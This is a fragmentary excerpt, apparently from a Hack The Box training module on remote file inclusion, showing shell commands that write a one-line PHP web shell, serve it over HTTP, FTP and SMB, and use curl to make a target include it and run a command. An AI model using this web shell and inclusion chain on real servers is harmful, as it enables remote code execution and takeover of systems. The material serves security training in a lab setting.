...
![](imgs/lfi_local_url_include.webp)
...
```shell-session
swmpdnky@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
...
```shell-session
swmpdnky@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
...
```shell-session
swmpdnky@htb[/htb]$ sudo python -m pyftpdlib -p 21
...
```shell-session
swmpdnky@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
...
```shell-session
swmpdnky@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
...
![](/storage/modules/23/windows_rfi.png)
